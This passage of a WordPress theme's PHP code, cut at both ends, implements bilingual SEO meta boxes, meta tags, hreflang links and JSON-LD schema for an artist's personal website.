            <input type="text" id="zk_seo_title<?php echo esc_attr( $field_suffix ); ?>" name="zk_seo_title<?php echo esc_attr( $field_suffix ); ?>" value="<?php echo esc_attr( $seo_title ); ?>" style="width:100%; margin-bottom:15px;" placeholder="Leave empty to use the translated page title..." />
            
            <label for="zk_seo_description<?php echo esc_attr( $field_suffix ); ?>" style="display:block; font-weight:600; margin-bottom:5px;">SEO Description (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
            <textarea id="zk_seo_description<?php echo esc_attr( $field_suffix ); ?>" name="zk_seo_description<?php echo esc_attr( $field_suffix ); ?>" rows="4" style="width:100%;" placeholder="Leave empty to use the translated excerpt or default description..."><?php echo esc_textarea( $seo_desc ); ?></textarea>
        </div>
        <?php endforeach; ?>
    </div>
    <?php
}

// 2. Save Meta Box Data
function zk_seo_save_meta( $post_id ) {
    if ( ! isset( $_POST['zk_seo_meta_nonce'] ) || ! wp_verify_nonce( $_POST['zk_seo_meta_nonce'], 'zk_seo_save_meta' ) ) return;
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;
    if ( ! current_user_can( 'edit_post', $post_id ) ) return;

    foreach ( zk_get_languages( false ) as $code => $language ) {
        $suffix = 'en' === $code ? '' : '_' . $code;
        $title_field = 'zk_seo_title' . $suffix;
        $desc_field  = 'zk_seo_description' . $suffix;
        if ( isset( $_POST[ $title_field ] ) ) {
            $title_value = zk_validate_seo_title_value( sanitize_text_field( wp_unslash( $_POST[ $title_field ] ) ) );
            update_post_meta( $post_id, zk_localized_meta_key( 'seo_title', $code ), $title_value );
        }
        if ( isset( $_POST[ $desc_field ] ) ) {
            update_post_meta( $post_id, zk_localized_meta_key( 'seo_description', $code ), sanitize_textarea_field( wp_unslash( $_POST[ $desc_field ] ) ) );
        }
    }
}
add_action( 'save_post', 'zk_seo_save_meta' );

// 2.1 Add Meta Fields to Taxonomies (Tags & Categories)
function zk_seo_taxonomy_add_meta_fields( $taxonomy = '' ) {
    foreach ( zk_get_languages( false ) as $code => $language ) {
        $suffix = 'en' === $code ? '' : '_' . $code;
        ?>
        <div class="form-field">
            <label for="zk_seo_title<?php echo esc_attr( $suffix ); ?>"><?php echo esc_html( $language['native_name'] ); ?> SEO Title (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
            <input type="text" name="zk_seo_title<?php echo esc_attr( $suffix ); ?>" id="zk_seo_title<?php echo esc_attr( $suffix ); ?>" value="">
        </div>
        <div class="form-field">
            <label for="zk_seo_description<?php echo esc_attr( $suffix ); ?>"><?php echo esc_html( $language['native_name'] ); ?> SEO Description (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
            <textarea name="zk_seo_description<?php echo esc_attr( $suffix ); ?>" id="zk_seo_description<?php echo esc_attr( $suffix ); ?>" rows="3"></textarea>
        </div>
        <div class="form-field">
            <label for="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>"><strong><?php echo esc_html( $language['native_name'] ); ?> AI Summary (<?php echo esc_html( strtoupper( $code ) ); ?>)</strong></label>
            <textarea name="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>" id="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>" rows="3"></textarea>
        </div>
        <div class="form-field">
            <label for="zk_geo_faq<?php echo esc_attr( $suffix ); ?>"><strong><?php echo esc_html( $language['native_name'] ); ?> FAQ Schema (<?php echo esc_html( strtoupper( $code ) ); ?>)</strong></label>
            <textarea name="zk_geo_faq<?php echo esc_attr( $suffix ); ?>" id="zk_geo_faq<?php echo esc_attr( $suffix ); ?>" rows="8" style="font-family:monospace;"></textarea>
            <p class="description">Q: Question?<br>A: Answer.</p>
        </div>
        <?php
    }
    if ( 'category' === $taxonomy ) return;
    ?>
    <div class="form-field">
        <label for="zk_seo_image">SEO Image URL</label>
        <input type="text" name="zk_seo_image" id="zk_seo_image" value="">
        <p class="description">Paste an image URL for social media sharing (Open Graph & Twitter). Leave empty to use site default.</p>
    </div>
    <?php
}
add_action( 'category_add_form_fields', 'zk_seo_taxonomy_add_meta_fields' );
add_action( 'post_tag_add_form_fields', 'zk_seo_taxonomy_add_meta_fields' );

function zk_seo_taxonomy_edit_meta_fields( $term ) {
    foreach ( zk_get_languages( false ) as $code => $language ) {
        $suffix = 'en' === $code ? '' : '_' . $code;
        foreach ( array( 'seo_title' => array( 'SEO Title', 0 ), 'seo_description' => array( 'SEO Description', 3 ), 'geo_ai_summary' => array( 'AI Summary', 3 ), 'geo_faq' => array( 'FAQ Schema', 8 ) ) as $field => $config ) {
            $value = zk_get_localized_term_meta( $term->term_id, $field, $code );
            ?>
            <tr class="form-field">
                <th scope="row"><label for="zk_<?php echo esc_attr( $field . $suffix ); ?>"><?php echo esc_html( $language['native_name'] . ' ' . $config[0] . ' (' . strtoupper( $code ) . ')' ); ?></label></th>
                <td>
                    <?php if ( 0 === $config[1] ) : ?>
                        <input type="text" name="zk_<?php echo esc_attr( $field . $suffix ); ?>" id="zk_<?php echo esc_attr( $field . $suffix ); ?>" value="<?php echo esc_attr( $value ); ?>">
                    <?php else : ?>
                        <textarea name="zk_<?php echo esc_attr( $field . $suffix ); ?>" id="zk_<?php echo esc_attr( $field . $suffix ); ?>" rows="<?php echo esc_attr( $config[1] ); ?>"<?php echo 'geo_faq' === $field ? ' style="font-family:monospace;"' : ''; ?>><?php echo esc_textarea( $value ); ?></textarea>
                    <?php endif; ?>
                </td>
            </tr>
            <?php
        }
    }
    if ( 'category' === $term->taxonomy ) return;
    $seo_img = get_term_meta( $term->term_id, '_zk_seo_image', true );
    ?>
    <tr class="form-field">
        <th scope="row" valign="top"><label for="zk_seo_image">SEO Image URL</label></th>
        <td>
            <input type="text" name="zk_seo_image" id="zk_seo_image" value="<?php echo esc_attr( $seo_img ); ?>">
            <p class="description">Paste an image URL for social media sharing (Open Graph & Twitter). Leave empty to use site default.</p>
        </td>
    </tr>
    <?php
}
add_action( 'category_edit_form_fields', 'zk_seo_taxonomy_edit_meta_fields' );
add_action( 'post_tag_edit_form_fields', 'zk_seo_taxonomy_edit_meta_fields' );

function zk_seo_save_taxonomy_meta( $term_id ) {
    foreach ( zk_get_languages( false ) as $code => $language ) {
        $suffix = 'en' === $code ? '' : '_' . $code;
        foreach ( array( 'seo_title', 'seo_description', 'geo_ai_summary', 'geo_faq' ) as $field ) {
            $input = 'zk_' . $field . $suffix;
            if ( isset( $_POST[ $input ] ) ) {
                $value = wp_unslash( $_POST[ $input ] );
                $value = 'seo_title' === $field
                    ? zk_validate_seo_title_value( sanitize_text_field( $value ) )
                    : sanitize_textarea_field( $value );
                update_term_meta( $term_id, zk_localized_meta_key( $field, $code ), $value );
            }
        }
    }
    if ( isset( $_POST['zk_seo_image'] ) ) {
        update_term_meta( $term_id, '_zk_seo_image', esc_url_raw( $_POST['zk_seo_image'] ) );
    }
}
add_action( 'created_category', 'zk_seo_save_taxonomy_meta' );
add_action( 'edited_category', 'zk_seo_save_taxonomy_meta' );
add_action( 'created_post_tag', 'zk_seo_save_taxonomy_meta' );
add_action( 'edited_post_tag', 'zk_seo_save_taxonomy_meta' );

// 3. Prevent WP Default Title Output & Inject Custom SEO Tags
// Ensure WP doesn't output its own <title> if theme supports it
remove_action( 'wp_head', '_wp_render_title_tag', 1 );

function zk_get_seo_target_id( $default_id ) {
    if ( is_page() && get_page_template_slug( $default_id ) === 'book-engine/template-book-reader.php' ) {
        $book_slug = get_post_field( 'post_name', $default_id );
        $book_posts = get_posts( array(
            'name'        => $book_slug,
            'post_type'   => 'zk_book',
            'post_status' => 'publish',
            'numberposts' => 1
        ) );
        if ( ! empty( $book_posts ) ) {
            return $book_posts[0]->ID;
        }
    }
    return $default_id;
}

function zk_is_internal_or_test_page( $post_id ) {
    if ( 'zk_tool' === get_post_type( $post_id ) ) return 'instavery' === get_post_meta( $post_id, '_zk_project_app', true );
    if ( 'page' !== get_post_type( $post_id ) ) return false;

    return in_array(
        get_page_template_slug( $post_id ),
        array(
            'template-analytics.php',
            'book-engine/template-book-manager.php',
            'page-instavery.php',
        ),
        true
    );
}

function zk_is_language_version_indexable( $language, $object_id = 0 ) {
    if ( is_singular() ) {
        $object_id = $object_id ?: get_queried_object_id();
        if ( zk_is_internal_or_test_page( $object_id ) ) return false;
        if ( 'en' === $language ) return true;
        $object_id = zk_get_seo_target_id( $object_id );
        return zk_is_post_translation_complete( $object_id, $language );
    }
    if ( 'en' === $language ) return true;
    if ( is_category() || is_tag() ) {
        return zk_is_term_translation_complete( get_queried_object(), $language );
    }
    return true;
}

function zk_get_clean_bilingual_urls() {
    $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
    $parsed = parse_url($request_uri);
    $path = isset($parsed['path']) ? $parsed['path'] : '/';

    // If on a singular post or page, get the canonical permalink path
    if ( is_singular() ) {
        $clean_permalink = get_permalink();
        $parsed_perm = parse_url($clean_permalink);
        if ( ! empty($parsed_perm['path']) ) {
            $path = $parsed_perm['path'];
        }
    } elseif ( is_category() || is_tag() || is_tax() ) {
        $term_id = get_queried_object_id();
        $term_link = get_term_link($term_id);
        if ( ! is_wp_error($term_link) ) {
            $parsed_term = parse_url($term_link);
            if ( ! empty($parsed_term['path']) ) {
                $path = $parsed_term['path'];
            }
        }
    }

    $en_path = function_exists( 'zk_strip_language_prefix' ) ? zk_strip_language_prefix( $path ) : preg_replace('#^/ka(?=/|$)#', '', $path);
    if ( ! $en_path ) $en_path = '/';

    $home_url = untrailingslashit(get_option('home'));
    if (empty($home_url)) {
        $home_url = 'https://zurabkostava.com';
    }

    $current = function_exists('zk_get_current_language') ? zk_get_current_language() : 'en';
    $urls = array();
    foreach ( zk_get_languages() as $code => $language ) {
        if ( ! zk_is_language_version_indexable( $code ) ) continue;
        $urls[ $code ] = $home_url . zk_get_language_path( $en_path, $code );
    }

    return array(
        'is_ka'         => 'ka' === $current,
        'current'       => $current,
        'urls'          => $urls,
        'en_url'        => $urls['en'],
        'ka_url'        => isset( $urls['ka'] ) ? $urls['ka'] : '',
        'canonical_url' => isset( $urls[ $current ] ) ? $urls[ $current ] : $urls['en'],
    );
}

function zk_render_seo_meta() {
    $seo_urls      = zk_get_clean_bilingual_urls();
    $language      = $seo_urls['current'];
    $is_ka         = 'ka' === $language;
    $canonical_url = $seo_urls['canonical_url'];
    $en_url        = $seo_urls['en_url'];
    $language_info = zk_get_language( $language );

    // Determine context
    $is_single = is_single() || is_page();
    $obj_id    = get_queried_object_id();
    $obj_id    = zk_get_seo_target_id( $obj_id );
    
    // Default Fallbacks
    $site_name_en = get_bloginfo( 'name' );
    if ( empty( $site_name_en ) ) {
        $site_name_en = 'Zurab Kostava';
    }
    $site_name_ka = get_option( 'zk_site_name_ka', 'ზურაბ კოსტავა' );
    $site_name    = $is_ka ? $site_name_ka : $site_name_en;

    $site_desc_en = get_bloginfo( 'description' );
    if ( empty( $site_desc_en ) ) {
        $site_desc_en = 'Georgian multidisciplinary artist, composer, and designer';
    }
    $site_desc_ka = get_option( 'zk_site_desc_ka', 'ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი და დიზაინერი' );
    $site_desc    = $is_ka ? $site_desc_ka : $site_desc_en;

    $title = $site_name . ( $site_desc ? ' — ' . $site_desc : '' );
    $desc  = $site_desc;
    $type  = 'website';
    $img   = get_option( 'zk_profile_img', '' );

    // Custom overrides
    $custom_title = '';
    $custom_desc  = '';
    $custom_img   = '';

    if ( $is_single ) {
        if ( is_front_page() || is_home() ) {
            $type = 'website';
            $custom_title = zk_get_localized_post_meta( $obj_id, 'seo_title', $language );
            $custom_desc  = zk_get_localized_post_meta( $obj_id, 'seo_description', $language );
        } elseif ( get_post_type( $obj_id ) === 'zk_book' ) {
            $type = 'book';
        } elseif ( get_post_type( $obj_id ) === 'zk_tool' ) {
            $type = 'website';
        } else {
            $type = 'article';
        }

        if ( ! ( is_front_page() || is_home() ) ) {
            $custom_title = zk_get_localized_post_meta( $obj_id, 'seo_title', $language );
            $custom_desc  = zk_get_localized_post_meta( $obj_id, 'seo_description', $language );
            $translated_title = 'en' === $language ? '' : get_post_meta( $obj_id, zk_language_meta_key( 'title', $language ), true );
            $title = ( $translated_title ?: get_the_title( $obj_id ) ) . ' — ' . $site_name;
            // Descriptive defaults only: never replace an editor's SEO title.
            if ( ! $custom_title && in_array( $language, array( 'en', 'ka' ), true ) ) {
                $route = 'zk_tool' === get_post_type( $obj_id ) ? get_post_meta( $obj_id, '_zk_project_app', true ) : get_page_uri( is_page() ? get_queried_object_id() : $obj_id );
                if ( 'zk_book' === get_post_type( $obj_id ) ) $route = trim( get_post_meta( $obj_id, '_zk_book_path', true ), '/' );
                $defaults = array(
                    'reader' => array( 'ReadRoad: EPUB & Voice Reader | Zurab Kostava', 'რიდროუდი: EPUB და ხმოვანი კითხვა | ზურაბ კოსტავა' ),
                    'visual' => array( 'Visual Art, Photography & Design | Zurab Kostava', 'ვიზუალური ხელოვნება და დიზაინი | ზურაბ კოსტავა' ),
                    'visual/paint' => array( 'Paintings & Original Art | Zurab Kostava', 'ნახატები და ორიგინალური ხელოვნება | ზურაბ კოსტავა' ),
                    'visual/graphic' => array( 'Graphic Design & Illustrations | Zurab Kostava', 'გრაფიკული დიზაინი და ილუსტრაციები | ზურაბ კოსტავა' ),
                    'visual/photography' => array( 'Photography & Visual Stories | Zurab Kostava', 'ფოტოგრაფია და ვიზუალური ისტორიები | ზურაბ კოსტავა' ),
                    'projects' => array( 'Digital Projects & Creative Tools | Zurab Kostava', 'ციფრული პროექტები და ინსტრუმენტები | ზურაბ კოსტავა' ),
                    'books/beta' => array( 'Beta — A Book by Zurab Kostava', 'ბეტა — წიგნი ზურაბ კოსტავასგან' ),
                );
                if ( isset( $defaults[ $route ] ) ) $title = $defaults[ $route ][ 'ka' === $language ? 1 : 0 ];
            }
            $translated_excerpt = 'en' === $language ? '' : get_post_meta( $obj_id, zk_language_meta_key( 'excerpt', $language ), true );
            $translated_content = 'en' === $language ? '' : get_post_meta( $obj_id, zk_language_meta_key( 'content', $language ), true );
            if ( $translated_excerpt ) {
                $desc = wp_strip_all_tags( $translated_excerpt );
            } elseif ( $translated_content ) {
                $desc = wp_trim_words( wp_strip_all_tags( $translated_content ), 30, '...' );
            } elseif ( has_excerpt( $obj_id ) ) {
                $desc = wp_strip_all_tags( get_the_excerpt( $obj_id ) );
            } else {
                $post_obj = get_post( $obj_id );
                // Shortcode-only pages (for example the Visual Hub) do not
                // have meaningful prose in post_content. Never expose the
                // shortcode itself as the search-result description.
                $plain_content = $post_obj
                    ? trim( wp_strip_all_tags( strip_shortcodes( $post_obj->post_content ) ) )
                    : '';
                if ( $plain_content ) {
                    $desc = wp_trim_words( $plain_content, 30, '...' );
                } else {
                    $page_name = $translated_title ?: get_the_title( $obj_id );
                    $desc = $is_ka
                        ? $page_name . ' — ზურაბ კოსტავას ხელოვნების, მუსიკის, ტექნოლოგიისა და დამოუკიდებელი შემოქმედებითი პროექტების ოფიციალური სივრცე.'
                        : $page_name . ' by Zurab Kostava — explore multidisciplinary art, music, technology, writing, and independent creative projects.';
                }
            }

            // Image logic
            if ( has_post_thumbnail( $obj_id ) ) {
                $img = get_the_post_thumbnail_url( $obj_id, 'large' );
            }
        }
    } elseif ( is_archive() ) {
        $term_id  = get_queried_object_id();
        $term_obj = get_queried_object();
        $custom_img = get_term_meta( $term_id, '_zk_seo_image', true );
        if ( is_category() ) $custom_img = zk_category_featured_image_url( $term_id );

        $custom_title = zk_get_localized_term_meta( $term_id, 'seo_title', $language );
        $custom_desc  = zk_get_localized_term_meta( $term_id, 'seo_description', $language );
        $term_name = function_exists( 'zk_get_translated_term_name' ) ? zk_get_translated_term_name( $term_obj ) : '';
        if ( ! $term_name && $term_obj && isset( $term_obj->name ) ) $term_name = $term_obj->name;
        $title = $term_name . ' — ' . $site_name;
        if ( ! $custom_title && ( is_category() || is_tag() ) ) {
            if ( 'en' === $language ) $title = 'Articles on ' . $term_name . ' | ' . $site_name;
            elseif ( 'ka' === $language ) $title = $term_name . ' — სტატიები | ' . $site_name;
        }
        $term_desc = 'en' === $language ? '' : get_term_meta( $term_id, zk_language_meta_key( 'description', $language ), true );
        if ( $term_desc ) {
            $desc = wp_strip_all_tags( $term_desc );
        } elseif ( is_category() ) {
            $desc = wp_strip_all_tags( category_description() ) ?: $desc;
        } elseif ( is_tag() ) {
            $desc = wp_strip_all_tags( tag_description() ) ?: $desc;
        }
    } elseif ( is_search() ) {
        if ( $is_ka ) {
            $title = 'ძიების შედეგები: "' . get_search_query() . '" — ' . $site_name;
            $desc  = 'ძიების შედეგები მოთხოვნისთვის "' . get_search_query() . '" — ' . $site_name;
        } else {
            $title = 'Search Results for "' . get_search_query() . '" — ' . $site_name;
            $desc  = 'Search results for "' . get_search_query() . '" — ' . $site_name;
        }
    } elseif ( is_404() ) {
        if ( $is_ka ) {
            $title = '404 გვერდი ვერ მოიძებნა — ' . $site_name;
            $desc  = 'მოთხოვნილი გვერდი არ არსებობს ან წაშლილია.';
        } else {
            $title = '404 Not Found — ' . $site_name;
            $desc  = 'The requested page was not found.';
        }
    }

    // --- GLOBAL META BOX OVERRIDE (STRICT HIGHEST PRIORITY) ---
    if ( ! empty( $custom_title ) ) {
        $title = $custom_title;
    }
    if ( ! empty( $custom_desc ) ) {
        $desc = $custom_desc;
    }
    if ( ! empty( $custom_img ) ) {
        $img = $custom_img;
    }

    // Clean up title and description to prevent HTML breaks
    $title = esc_attr( wp_strip_all_tags( $title ) );
    $desc  = esc_attr( wp_strip_all_tags( $desc ) );

    $og_locale = str_replace( '-', '_', $language_info['locale'] );

    // Output Tags
    echo "\n<!-- ZK Custom SEO Engine -->\n";
    echo "<title>{$title}</title>\n";
    if ( ! empty( $desc ) ) {
        echo "<meta name=\"description\" content=\"{$desc}\" />\n";
    }
    
    if ( ! is_404() ) {
        // Canonical URL
        echo "<link rel=\"canonical\" href=\"" . esc_url( $canonical_url ) . "\" />\n";

        // Advertise only complete language equivalents to search engines.
        foreach ( $seo_urls['urls'] as $language_code => $language_url ) {
            echo "<link rel=\"alternate\" hreflang=\"" . esc_attr( $language_code ) . "\" href=\"" . esc_url( $language_url ) . "\" />\n";
        }
        echo "<link rel=\"alternate\" hreflang=\"x-default\" href=\"" . esc_url( $en_url ) . "\" />\n";
    }
    
    // Open Graph
    echo "<meta property=\"og:title\" content=\"{$title}\" />\n";
    if ( ! empty( $desc ) ) echo "<meta property=\"og:description\" content=\"{$desc}\" />\n";
    echo "<meta property=\"og:url\" content=\"" . esc_url( $canonical_url ) . "\" />\n";
    echo "<meta property=\"og:site_name\" content=\"" . esc_attr( $site_name ) . "\" />\n";
    echo "<meta property=\"og:type\" content=\"{$type}\" />\n";
    echo "<meta property=\"og:locale\" content=\"{$og_locale}\" />\n";
    foreach ( zk_get_languages() as $code => $alternate_language ) {
        if ( $code !== $language ) {
            echo '<meta property="og:locale:alternate" content="' . esc_attr( str_replace( '-', '_', $alternate_language['locale'] ) ) . '" />' . "\n";
        }
    }
    if ( ! empty( $img ) ) echo "<meta property=\"og:image\" content=\"" . esc_url( $img ) . "\" />\n";
    
    // Twitter Cards
    echo "<meta name=\"twitter:card\" content=\"summary_large_image\" />\n";
    echo "<meta name=\"twitter:title\" content=\"{$title}\" />\n";
    if ( ! empty( $desc ) ) echo "<meta name=\"twitter:description\" content=\"{$desc}\" />\n";
    if ( ! empty( $img ) ) echo "<meta name=\"twitter:image\" content=\"" . esc_url( $img ) . "\" />\n";
    echo "<!-- /ZK Custom SEO Engine -->\n";
}
add_action( 'wp_head', 'zk_render_seo_meta', 1 );

// 4. JSON-LD Schema Generator (AI & Google SEO)
function zk_render_json_ld_schema() {
    $seo_urls      = zk_get_clean_bilingual_urls();
    $current_language = $seo_urls['current'];
    $is_ka         = 'ka' === $current_language;
    $language_info = zk_get_language( $current_language );
    $content_locale = $language_info['locale'];
    $canonical_url = $seo_urls['canonical_url'];

    $site_name_en = get_bloginfo( 'name' ) ?: 'Zurab Kostava';
    $site_name_ka = get_option( 'zk_site_name_ka', 'ზურაბ კოსტავა' );
    $site_name    = $is_ka ? $site_name_ka : $site_name_en;
    $site_url     = home_url( '/' );
    // A Person must keep one canonical entity ID in every language. `home_url()`
    // is language-filtered on translated routes, while the saved home option is not.
    $identity_url = trailingslashit( esc_url_raw( (string) get_option( 'home', home_url( '/' ) ) ) );
    $website_id   = $identity_url . '#website';
    $person_id    = $identity_url . '#person';
    $logo_url     = get_option( 'zk_profile_img', '' );
    
    // Build Social Links array
    $social_keys = ['zk_social_ig', 'zk_social_fb', 'zk_social_x', 'zk_social_linkedin', 'zk_social_youtube', 'zk_social_spotify', 'zk_social_bandcamp', 'zk_social_medium', 'zk_social_behance', 'zk_social_musicbrainz'];
    $social_defaults = [
        'zk_social_behance' => 'https://www.behance.net/zurabkostava',
        'zk_social_musicbrainz' => 'https://musicbrainz.org/artist/61081717-65c9-4717-9683-9ca286ae30e7',
    ];
    $same_as = [];
    foreach ($social_keys as $key) {
        $url = esc_url(get_option($key, $social_defaults[$key] ?? ''));
        if (!empty($url) && $url !== '#' && $url !== 'http://#' && $url !== 'https://#') {
            $same_as[] = $url;
        }
    }

    $schema_name = $is_ka ? $site_name_ka : get_option('zk_schema_name', 'Zurab Kostava');
    $schema_alternate_raw = array_map('trim', explode(',', get_option('zk_schema_alternate_names', 'ზურაბ კოსტავა, Zurab Kostava, Zura Kostava')));
    $schema_alternate = [];
    $seen_aliases = [];
    $ambiguous_aliases = [ 'zurab', 'kostava', 'ზურაბ', 'კოსტავა' ];
    $normalized_schema_name = function_exists( 'mb_strtolower' ) ? mb_strtolower( $schema_name, 'UTF-8' ) : strtolower( $schema_name );
    foreach ( $schema_alternate_raw as $alias ) {
        $normalized_alias = function_exists( 'mb_strtolower' ) ? mb_strtolower( $alias, 'UTF-8' ) : strtolower( $alias );
        if ( '' === $normalized_alias || $normalized_alias === $normalized_schema_name || in_array( $normalized_alias, $ambiguous_aliases, true ) || isset( $seen_aliases[ $normalized_alias ] ) ) {
            continue;
        }
        $seen_aliases[ $normalized_alias ] = true;
        $schema_alternate[] = $alias;
    }
    
    $default_jobs = $is_ka ? 'ხელოვანი, კომპოზიტორი, ვიზუალური არტისტი, დიზაინერი' : 'Artist, Composer, Visual Artist, Designer';
    $schema_job_titles_raw = $is_ka ? get_option('zk_schema_job_titles_ka', $default_jobs) : get_option('zk_schema_job_titles', $default_jobs);
    $schema_job_titles = array_map('trim', explode(',', $schema_job_titles_raw));
    
    $default_desc = $is_ka ? 'ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი და დიზაინერი. Nuvio-ს დამფუძნებელი.' : 'Georgian multidisciplinary artist, composer, and designer. Founder of Nuvio.';
    $schema_desc = $is_ka ? get_option('zk_schema_description_ka', $default_desc) : get_option('zk_schema_description', $default_desc);
    
    $schema_birth = get_option('zk_schema_birth_date', '1995-02-19');
    $schema_gender = get_option('zk_schema_gender', 'Male');
    $schema_wikidata = get_option('zk_schema_wikidata', 'https://www.wikidata.org/wiki/Q138009804');
    $schema_knows_about = array_map('trim', explode(',', get_option('zk_schema_knows_about', 'Web Design, UI/UX, Science Fiction, Music Production, Literature, Art Direction, Cinematic Soundscapes, Digital Art')));

    if (!empty($schema_wikidata)) {
        $same_as[] = trim($schema_wikidata);
    }

    // Base Person Schema
    $person_schema = [
        '@context' => 'https://schema.org',
        '@type' => 'Person',
        'name' => $schema_name,
        'alternateName' => $schema_alternate,
        'url' => $identity_url,
        'jobTitle' => $schema_job_titles,
        'description' => $schema_desc,
        'disambiguatingDescription' => $is_ka
            ? '1995 წელს დაბადებული ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი, დიზაინერი და ციფრული შემოქმედი.'
            : 'Georgian multidisciplinary artist, composer, designer, and digital creator born in 1995.',
        'givenName' => $is_ka ? 'ზურაბ' : 'Zurab',
        'familyName' => $is_ka ? 'კოსტავა' : 'Kostava',
        'birthDate' => $schema_birth,
        'birthPlace' => [
            '@type' => 'Place',
            'name' => $is_ka ? 'ოზურგეთი, საქართველო' : 'Ozurgeti, Georgia'
        ],
        'gender' => $schema_gender,
        'knowsAbout' => $schema_knows_about,
        'nationality' => [
            '@type' => 'Country',
            'name' => 'Georgia'
        ],
        'image' => $logo_url,
        'sameAs' => array_values(array_unique($same_as)),
        'mainEntityOfPage' => $identity_url . 'about/',
        '@id' => $person_id
    ];

    if ( is_page('about') ) {
        $about_name = $is_ka ? 'ზურაბ კოსტავას შესახებ | იდენტობა, მონოლოგი, გალერეა' : 'About Zurab Kostava | Identity, Monologue, Gallery';
        $about_desc = $is_ka ? 'გაიცანით ზურაბ კოსტავას იდენტობა. წაიკითხეთ პირადი მონოლოგი, გაეცანით მის ციფრულ ID-ს, მულტიდისციპლინურ უნარებს, კულტურულ გავლენებსა და გალერეას.' : 'Discover the unfiltered identity of Zurab Kostava. Read the personal monologue, explore his digital ID, multidisciplinary skills, cultural influences, and gallery.';
        
        $schema = [
            "@context" => "https://schema.org",
            "@graph" => [
                [
                    "@type" => "AboutPage",
                    "@id" => $canonical_url,
                    "url" => $canonical_url,
                    "inLanguage" => $content_locale,
                    "name" => $about_name,
                    "description" => $about_desc,
                    "mainEntity" => [
                        "@id" => $person_id
                    ]
                ],
                $person_schema
            ]
        ];

        echo "\n<!-- ZK JSON-LD Schema Engine -->\n";
        echo "<script type=\"application/ld+json\">\n";
        echo json_encode( $schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT );
        echo "\n</script>\n";
        echo "<!-- /ZK JSON-LD Schema Engine -->\n";
        return;
    }

    $schema = [];
    $person_schema['@id'] = $person_id;
    $schema[] = $person_schema;
    $schema[] = [
        '@context' => 'https://schema.org',
        '@type' => 'WebSite',
        '@id' => $website_id,
        'name' => $site_name_en,
        'alternateName' => $site_name_ka,
        'url' => $identity_url,
        'inLanguage' => array_values( array_column( zk_get_languages(), 'locale' ) ),
        'publisher' => [
            '@id' => $person_id
        ]
    ];

    if ( is_front_page() ) {
        // Translations are separate pages within one website and share one Person.
        $home_id = get_queried_object_id();
        $home_title = zk_get_localized_post_meta( $home_id, 'seo_title', $current_language );
        $home_desc = zk_get_localized_post_meta( $home_id, 'seo_description', $current_language );
        $site_desc_en = get_bloginfo( 'description' ) ?: 'Georgian multidisciplinary artist, composer, and designer';
        $site_desc = $is_ka ? get_option( 'zk_site_desc_ka', 'ქართველი მულტიდისციპლინური ხელოვანი, კომპოზიტორი და დიზაინერი' ) : $site_desc_en;
        $schema[] = [
            '@context' => 'https://schema.org',
            '@type' => 'WebPage',
            '@id' => $canonical_url . '#webpage',
            'url' => $canonical_url,
            'name' => wp_strip_all_tags( $home_title ?: $site_name . ( $site_desc ? ' — ' . $site_desc : '' ) ),
            'description' => wp_strip_all_tags( $home_desc ?: $site_desc ),
            'inLanguage' => $content_locale,
            'isPartOf' => [ '@id' => $website_id ],
            'mainEntity' => [ '@id' => $person_id ],
        ];
    }

    $is_book_page = is_page() && get_page_template_slug( get_queried_object_id() ) === 'book-engine/template-book-reader.php';

    if ( is_singular( 'post' ) || ( is_page() && ! is_front_page() && ! $is_book_page ) ) {
        global $post;
        $post_id = $post ? $post->ID : get_queried_object_id();
        
        $translated_title = 'en' === $current_language ? '' : get_post_meta( $post_id, zk_language_meta_key( 'title', $current_language ), true );
        $translated_excerpt = 'en' === $current_language ? '' : get_post_meta( $post_id, zk_language_meta_key( 'excerpt', $current_language ), true );
        $translated_content = 'en' === $current_language ? '' : get_post_meta( $post_id, zk_language_meta_key( 'content', $current_language ), true );
        $headline = zk_get_localized_post_meta( $post_id, 'seo_title', $current_language ) ?: ( $translated_title ?: get_the_title( $post_id ) );
        $desc = zk_get_localized_post_meta( $post_id, 'seo_description', $current_language ) ?: ( $translated_excerpt ?: wp_trim_words( wp_strip_all_tags( $translated_content ?: $post->post_content ), 30, '' ) );

        $article_schema = [
            '@context' => 'https://schema.org',
            '@type' => 'Article',
            'inLanguage' => $content_locale,
            'headline' => $headline,
            'description' => esc_attr( $desc ),
            'datePublished' => get_the_date( 'c', $post_id ),
            'dateModified' => get_the_modified_date( 'c', $post_id ),
            'author' => [
                '@id' => $person_id
            ],
            'publisher' => [
                '@id' => $person_id
            ],
            'mainEntityOfPage' => [
                '@type' => 'WebPage',
                '@id' => $canonical_url
            ],
            'speakable' => [
                '@type' => 'SpeakableSpecification',
                'cssSelector' => ['h1', 'h2', 'p']
            ]
        ];

        // Extract WP Tags and Categories for Keywords
        $keywords = [];
        $tags = get_the_tags($post_id);
        if ($tags) {
            foreach($tags as $tag) {
                $keywords[] = 'en' !== $current_language && function_exists('zk_get_translated_term_name') ? zk_get_translated_term_name($tag) : $tag->name;
            }
        }
        $categories = get_the_category($post_id);
        if ($categories) {
            foreach($categories as $cat) {
                $keywords[] = 'en' !== $current_language && function_exists('zk_get_translated_term_name') ? zk_get_translated_term_name($cat) : $cat->name;
            }
        }
        if (!empty($keywords)) {
            $article_schema['keywords'] = implode(', ', array_unique($keywords));
        }
        
        if ( has_post_thumbnail( $post_id ) ) {
            $article_schema['image'] = get_the_post_thumbnail_url( $post_id, 'full' );
        }
        $schema[] = $article_schema;

    } elseif ( is_singular( 'zk_book' ) || $is_book_page ) {
        $target_id  = function_exists('zk_get_seo_target_id') ? zk_get_seo_target_id( get_queried_object_id() ) : get_queried_object_id();
        $year       = get_post_meta( $target_id, '_zk_book_year', true );
        $genre      = zk_book_localized_detail( $target_id, 'genre', $current_language );
        $seo_desc   = zk_get_localized_post_meta( $target_id, 'seo_description', $current_language );
        $characters = get_post_meta( $target_id, '_zk_book_characters', true );
        $themes     = get_post_meta( $target_id, '_zk_book_themes', true );
